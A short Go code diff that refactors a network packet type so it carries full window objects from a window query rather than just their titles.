@@ -6,7 +6,7 @@ import (
 )
 
 type WindowsPacket struct {
-	Titles []string `network:"send"`
+	Windows []common.Window `network:"send"`
 }
 
 func (packet WindowsPacket) Header() common.PacketHeader {
@@ -16,9 +16,7 @@ func (packet WindowsPacket) Header() common.PacketHeader {
 func (packet *WindowsPacket) Init() {
 	windows.QueryWindows()
 
-	for _, win := range windows.Windows {
-		packet.Titles = append(packet.Titles, win.Title)
-	}
+	packet.Windows = windows.Windows
 }
 
 func (packet WindowsPacket) OnReceive() error {
